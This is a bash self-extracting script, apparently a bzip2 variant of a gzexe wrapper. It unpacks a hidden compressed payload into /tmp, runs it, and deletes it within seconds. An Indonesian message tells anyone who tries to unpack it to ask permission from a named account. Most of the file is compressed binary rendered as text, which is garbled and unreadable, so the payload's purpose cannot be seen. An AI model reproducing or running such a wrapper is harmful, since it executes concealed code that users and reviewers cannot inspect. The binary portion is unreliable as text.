#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY@;�: �_�m}�����������PD@  � ����6ZuӴ�ܲٮ��Zj���S@ՠi"z����M =F!� Q��4 ��8  hd h @44  � � �����@� 4C@ � !SMyG�'��@�4��z�� ��� ��&@�L!�S�i�hj3I��=M24ɂ24�����A"��&�&S� �&�{Q�ѣC#  �C@""���u�=G��Z����%��2�]�!ハ)dK���ny�>3	VU�+p�!O�����%��O�@�ZedKK2S��a�\�Q�G��a�"�RJµ�$�3��cX����.�B�Ș�ŭ��+	�B��`0[�Nt9q��..�/A.ݒ�\��g��'@,�j�R%���@�1�BQ|d7� g�#� x�"��XQy�ȳ����=QDѸ��j�Ť�3(~���u�&='�E�p�x��ϡȻY	*��d��������#:�Z�|~ڸ�D���eZ�:����
�G�u�(I�N���ݳ-��2.������:h�w
MG��X>S��vi�w|�8(\�A�)w�sO�g��i`N�ᣚ�C�t(vҼq
���(���\mC��!�gf.���T�����sP��ff ��M�vBl���V��qS� 檴v��D�{O�Q<�J�"�&&�\�Aot��7��l���tT�p�eØ�CE�
H�te���Ud���;�y/�l1��� (�i{ňD�r�;���o�3*����鳬�z��a��Ց ��hk1 o�L���+ZbpФ\
e�ʒU�<ݦi��$�@)�%�m�!���{2����;����B�l��m�)ӧ���f��x�w�c�! C@0�v��4m�^@`�	"+H[!�CC����>#R��c���ȠcLC-<����C�앢h����\^\�X�#Li�4������Z�)?xk��l�u �&��WҿQL'|D#Ԅ+aF��h��6Z�<��=�j���
���l��T8�n*
�������>��cЊ��m�~a������������,ե�藮�⠛m���H���K��ٰl����eX�fIunj 9;E�BC�0K����Cv�b+5�D^B)I	I���tw _�;+0DΎK��R��$i�{E�R�+J�[S�����b��o��/\F7��u0�i`��#��)<?�H����Pt�cL�`�%n4GY�Q��s��)��(	��)����G�Ckn��P�8�d��S�t�H��\6<����[�����˱���#�~�f"���3!܏sp�$炚����9�����:�@�`��ploψ���G9���|�A�m7L�����8#i�;��vjEU*R&!Y�vl����^���U����V�93<a�EG0B}V�OQJ�V2�ѿ��hs��r`
jf'�%�J�e����pb�d	��/a,�B��19<ǲU�Ʌ����>�*r�D���T��.a�YӪ�N�v-^�'̈O6��1��'C�%��Rw�D� Nމ����#���R9��i�Z{���)}�x�T�C��J���"��
s?��EO�3��JP��t\i�q�S�F�7|���r�A�x�cR�Q���s�P����2x
�\"���m�&����G�Ĵ �ҳ�-��xĽe1� ���N�Dh6����T�$@�� !X��G�4�kd�	�7R�F�D�0I8q5�20nl�ǫ�)7��e��A����"C
����a�����\�ҳ������D��ûA�D O]�S��hv�"�7�
Y2e����􀭎�3<�Qa��z2d&�/�w~b҅$YfdaB�0P�B�BB���;
,��5���c�OBD<w��]F���pSK`1�f�z��֋ �hJ�*u�H�'Y1�!@|��eE��Q����m���K�7$t$�A��N=|6�A�(D��.gr7ω:��[M��*3�-�t1�:��a2�Q9��� h5�@q��6T�
v��n��	Bu@�$�\Iג��Y�ν��V��|�=<��$z�&����4CD�����C��ѧ�6Y���i{�V���Ib��3F$J��0^#�m��h�ɫ`4j��Ζ��Ėn"���Ij�g%a,��3\i�-x��hƖܐ2�u��� �	�:�c fGB�CTt =�G;f�%�(�Si�L/`�6)�j.26�(G4���_�ڍ¸�ɦ���RH*Y���n7����#�V���ޗ��w���ա,Y̏1�*46$��5
E#
�d������q
"&��A�@B�� ��)�y�PF�
�P��"߾R'���4()*��2�F�!�Ci%0�2�iɐ�K�^�B<D(()U�xDk�5���r�Z�����,2sͲoF���6�����@�5�k�bi&ppG�蓮�"�,��by5�I\4�+��|���Y�?R.�]W��\��	*����I,Dб�C�oB
(Z �"!��Zl�+pG|5�X,Fà9כP���3�$��$��K���;y���0�j��M����;F&�!�`,�TZi��gQ�����Ӧ�aWE�{)�-��ѦH[���$������M�H�A��(N�	�`��r^�E�41��D��_`HԜ��%�� �4�J��9UB.$n�(D6:�F��UWTVV[PV��v������1�N�	�+SH�H�1Ih�̐4��⮂�WU�+3���6wj�XA$q��Z�A�B@o7�W`Z�B�X�NJ	�E�U��4}f~D%3k�>�X�����g9y����I���Eѻ�9�ݲ�����ϒrJY$������H�[��4I�R��b!�ɡ&q�ʀ+��)	�zXf�"%��F��d��(��9H�,�8��}D�66�o,w}�Z�8|�����a<��Bz�
�D	(" ]
��)
p��H�
pG@